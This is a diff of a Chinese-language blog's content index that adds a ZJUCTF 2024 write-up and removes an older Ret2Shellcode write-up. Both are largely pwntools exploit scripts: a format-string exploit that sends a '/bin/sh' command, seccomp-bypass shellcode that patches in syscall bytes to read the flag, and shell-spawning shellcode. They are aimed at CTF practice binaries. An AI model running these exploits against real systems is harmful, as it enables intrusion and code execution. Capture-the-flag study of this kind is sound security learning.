class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;; /bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag: <code>ZJUCTF&#123;f0rMAt_5TR1Ng_bU9_iS_O1D_8uT_c001|0335&#125;</code></p>
+<h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>禁用了execve系统调用，并且不允许syscall（<code>\x0f\x05</code>）字节出现，同时还没有给出flag的文件名。</p>
+<ol>
+<li>通过先传入<code>\x0f\x03</code>，然后将其与<code>\x06</code>异或即可得到syscall。</li>
+<li>通过<code>getdents64</code>系统调用获取到目标flag文件名</li>
+<li>通过<code>orw</code>获取flag内容</li>
+</ol>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000014BF)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">36007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="comment">#     .global _start</span></span><br><span class="line"><span class="comment">#     .global __start</span></span><br><span class="line"><span class="comment">#     _start:</span></span><br><span class="line"><span class="comment">#     __start:</span></span><br><span class="line"><span class="comment">#     .intel_syntax noprefix</span></span><br><span class="line"><span class="comment">#     .p2align 0</span></span><br><span class="line"><span class="comment">#         /* open(file=&#x27;/&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="comment">#         /* push b&#x27;/\x00&#x27; */</span></span><br><span class="line"><span class="comment">#         push rdx</span></span><br><span class="line"><span class="comment">#         push 0x2f</span></span><br><span class="line"><span class="comment">#         mov rdi, rsp</span></span><br><span class="line"><span class="comment">#         xor edx, edx /* 0 */</span></span><br><span class="line"><span class="comment">#         xor esi, esi /* 0 */</span></span><br><span class="line"><span class="comment">#         /* call open() */</span></span><br><span class="line"><span class="comment">#         push 2 /* 2 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rdx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rdx+0x1e], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* getdents64(fd=&#x27;rax&#x27;, dirp=&#x27;rsp&#x27;, count=0x1000) */</span></span><br><span class="line"><span class="comment">#         mov rdi, rax</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call getdents64() */</span></span><br><span class="line"><span class="comment">#         xor eax, eax</span></span><br><span class="line"><span class="comment">#         mov al, 217 /* 0xd9 */</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x46], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* write(fd=1, buf=&#x27;rsp&#x27;, n=0x1000) */</span></span><br><span class="line"><span class="comment">#         push 1</span></span><br><span class="line"><span class="comment">#         pop rdi</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call write() */</span></span><br><span class="line"><span class="comment">#         push 1 /* 1 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x6d], 0x6</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;) + b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># de27cb9335d01bb7576f00a72c13239d</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="string">    .global _start</span></span><br><span class="line"><span class="string">    .global __start</span></span><br><span class="line"><span class="string">    _start:</span></span><br><span class="line"><span class="string">    __start:</span></span><br><span class="line"><span class="string">    .intel_syntax noprefix</span></span><br><span class="line"><span class="string">    .p2align 0</span></span><br><span class="line"><span class="string">        /* open(file=&#x27;/de27cb9335d01bb7576f00a72c13239d&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="string">        /* push b&#x27;/de27cb9335d01bb7576f00a72c13239d\x00&#x27; */</span></span><br><span class="line"><span class="string">        push rdx</span></span><br><span class="line"><span class="string">        push 0x64</span></span><br><span class="line"><span class="string">        mov rax, 0x3933323331633237</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6130306636373537</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6262313064353333</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x396263373265642f</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">        /* call open() */</span></span><br><span class="line"><span class="string">        push 2 /* 2 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x4a], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor eax, eax /* SYS_read */</span></span><br><span class="line"><span class="string">        xor edx, edx</span></span><br><span class="line"><span class="string">        mov dh, 0x100 &gt;&gt; 8</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x68], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* write(fd=0, buf=&#x27;rsp&#x27;, n=&#x27;rax&#x27;) */</span></span><br><span class="line"><span class="string">        mov rdi, 1 /* 0 */</span></span><br><span class="line"><span class="string">        mov rdx, rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* call write() */</span></span><br><span class="line"><span class="string">        push 1 /* 1 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x8d], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag内容：<code>ZJUCTF&#123;M45ter_of_O_R_W&#125;</code></p>
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="rev-beginner-1"><a href="#rev-beginner-1" class="headerlink" title="rev beginner 1"></a>rev beginner 1</h3><p>基础逆向题：</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev1&#x27;</span>)</span><br><span class="line">temp = <span class="string">b&#x27;\x5a\x4b\x57\x46&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x58\x4b\x81\x79&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x6d\x7f\x69\x74&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7f\x6c\x74\x84&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7e\x70\x84\x7c&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7b\x7d\x8a\x56\x95&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> temp:</span><br><span class="line">    result += p8(t - i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">info(<span class="string">f&quot;result: <span class="subst">&#123;result.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">p.sendline(result)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag: <code>ZJUCTF&#123;rev_is_fun_right?&#125;</code></p>
+<h4 id="rev-beginner-2"><a href="#rev-beginner-2" class="headerlink" title="rev beginner 2"></a>rev beginner 2</h4><p>基础逆向题，通过模拟das指令进行逐字符爆破，得到flag</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev2&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x00001336)&#x27;</span>)</span><br><span class="line">v12 = <span class="string">b&#x27;\x3c\x1e\x23\x30&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x0d\x4d\x79&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x42\x3d\x4f\xdb&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\xff\xb3\x2f\x00&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x1f\x3e\x32\x4f&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x3e\xa3\xa4\x21\x8f&#x27;</span></span><br><span class="line"></span><br><span class="line">v14 = <span class="string">b&#x27;\x75\x82\x9b\xd1&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xf6\xbb\xa6\x36&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xac\xe8\xb1\x7f&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb0\x67\xb8\x19&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb6\x3f\x38\x07&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\x2e\xbd\x83\x52\xf5\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">b&#x27;\x8d\xa8\xcd\xe4&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xf8\xee\xce\xce&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xcf\x11\xbf\x6e&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xb8\xb9\x50\x4b&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xbe\x6d\x6b\x28&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x41\xeb\xf3\xb3\xf5\x87&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">das_simulation</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="comment"># 假设 a 和 b 都是16位的BCD值（输入为整数）</span></span><br><span class="line">    <span class="comment"># 只考虑AL寄存器，即最低8位的操作</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两个数减法</span></span><br><span class="line">    result = a - b</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取出低8位，模拟 AL 寄存器的效果</span></span><br><span class="line">    al = result &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="comment"># info(al)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 CF 和 AF 标志</span></span><br><span class="line">    cf = <span class="number">0</span></span><br><span class="line">    af = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 AF（低4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0x0F</span>) &gt; <span class="number">9</span> <span class="keyword">or</span> ((a &amp; <span class="number">0x0F</span>) &lt; (b &amp; <span class="number">0x0F</span>)):</span><br><span class="line">        al = (al - <span class="number">6</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正低四位</span></span><br><span class="line">        af = <span class="number">1</span>  <span class="comment"># 设置 AF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 CF（高4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0xF0</span>) &gt; <span class="number">0x90</span> <span class="keyword">or</span> result &lt; <span class="number">0</span>:</span><br><span class="line">        al = (al - <span class="number">0x60</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正高四位</span></span><br><span class="line">        cf = <span class="number">1</span>  <span class="comment"># 设置 CF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> al, cf, af</span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    info(<span class="string">f&#x27;i : <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        al, cf, af = das_simulation(guess, v12[i])</span><br><span class="line">        <span class="comment"># info(f&#x27;al: &#123;hex(al)&#125;, cf: &#123;cf&#125;, af: &#123;af&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">if</span> (al + v14[i])&amp;<span class="number">0xff</span> == temp[i]:</span><br><span class="line">            info(<span class="string">f&quot;guess: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span> is correct&quot;</span>)</span><br><span class="line">            result += p8(guess)</span><br><span class="line">            info(<span class="string">f&quot;result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> guess == <span class="number">255</span>:</span><br><span class="line">        result += <span class="string">b&#x27;*&#x27;</span></span><br><span class="line">p.sendline(result)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<code>ZJUCTF&#123;welc0me-2-reverse!&#125;</code></p>
+<h4 id="中-A-口算"><a href="#中-A-口算" class="headerlink" title="中 A 口算"></a>中 A 口算</h4><p>其种子为2010年同一时间，因此可以预测所有的题目。</p>
+<p><img src="/images/2024-10-22-2024-ZJUCTF-WriteUp.assets/image-20241022212702474.png" alt="image-20241022212702474"></p>
+<p>如图，只要存在answer，就会一直生成题目，因此可以一次输入足够长（0x1000长度）的答案，可以快速得分</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># 601681286521741824 ? 2198172281756103560</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定日期（年-月-日 时:分:秒）</span></span><br><span class="line">year = <span class="number">2010</span></span><br><span class="line">month = <span class="number">10</span></span><br><span class="line">day = <span class="number">22</span></span><br><span class="line">hour = <span class="number">21</span></span><br><span class="line">minute = <span class="number">26</span></span><br><span class="line">second = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 datetime 对象</span></span><br><span class="line">dt = datetime(year, month, day, hour, minute, second)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(dt.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">37093</span>)</span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = 0</span></span><br><span class="line">guess = -<span class="number">0x1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Question Set:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get first challenge</span></span><br><span class="line">challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">v2 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">v2[<span class="number">0</span>] = <span class="built_in">int</span>(v2[<span class="number">0</span>])</span><br><span class="line">v2[<span class="number">1</span>] = <span class="built_in">int</span>(v2[<span class="number">1</span>])</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3600</span>):</span><br><span class="line">    <span class="comment"># 获取当前时间（秒级别）</span></span><br><span class="line">    guess += <span class="number">1</span></span><br><span class="line">    info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">    info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">    seed_correct = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001858)</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001994)&quot;&quot;&quot;)</span></span><br><span class="line">    libc.srand(seed+guess)</span><br><span class="line">    <span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">        v1 = libc.rand()  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">        v2 = libc.rand()</span><br><span class="line">        v3 = (v1 &lt;&lt; <span class="number">31</span>) | v2 ^ libc.rand()</span><br><span class="line">        v4 = v2 | ((v1 ^ libc.rand()) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        info(<span class="string">f&quot;question:\t <span class="subst">&#123;v3&#125;</span> ? <span class="subst">&#123;v4&#125;</span> &quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> v3, v4</span><br><span class="line"></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10089</span>):</span><br><span class="line">        v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        info(<span class="string">f&quot;challenge:\t<span class="subst">&#123;v2[<span class="number">0</span>]&#125;</span> ? <span class="subst">&#123;v2[<span class="number">1</span>]&#125;</span> &quot;</span>)</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> v2[<span class="number">0</span>] == v1[<span class="number">0</span>] <span class="keyword">and</span> v2[<span class="number">1</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">                info(<span class="string">&quot;correct&quot;</span>)</span><br><span class="line">                pause()</span><br><span class="line">                seed_correct = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> seed_correct == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;submit your score&#x27;</span>, answer)</span><br><span class="line">    <span class="comment"># break</span></span><br><span class="line">    <span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>ZJUCTF&#123;5aK1-CHan&#39;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</code></p>
 ]]></content>
       <tags>
-        <tag>DSE</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
     <title>【ciscn_2019_es_2】WriteUp</title>
     <url>/posts/d92ba103.html</url>
-    <content><![CDATA[<h1 id="【ciscn-2019-es-2】WriteUp"><a href="#【ciscn-2019-es-2】WriteUp" class="headerlink" title="【ciscn_2019_es_2】WriteUp"></a>【ciscn_2019_es_2】WriteUp</h1><p><code>checksec</code>一下，发现只有NX防护。</p>
+    <content><![CDATA[<p><code>checksec</code>一下，发现只有NX防护。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn11/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 
 <p>使用ida打开，发现s存在溢出漏洞，但是只能溢出8字节，无法调用write等函数进行RetLibc。因此考虑栈迁移。</p>
@@ -2269,39 +2352,9 @@
       </tags>
   </entry>
   <entry>
-    <title>【ez_pz_hackover_2016】WriteUp</title>
-    <url>/posts/478cb6ca.html</url>
-    <content><![CDATA[<h1 id="【ez-pz-hackover-2016】WriteUp"><a href="#【ez-pz-hackover-2016】WriteUp" class="headerlink" title="【ez_pz_hackover_2016】WriteUp"></a>【ez_pz_hackover_2016】WriteUp</h1><p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>Pwn</tag>
-        <tag>Ret2Shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bochspwn学习</title>
-    <url>/posts/96f187a0.html</url>
-    <content><![CDATA[<h1 id="Bochspwn"><a href="#Bochspwn" class="headerlink" title="Bochspwn"></a>Bochspwn</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
-<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
-]]></content>
-      <tags>
-        <tag>论文复现</tag>
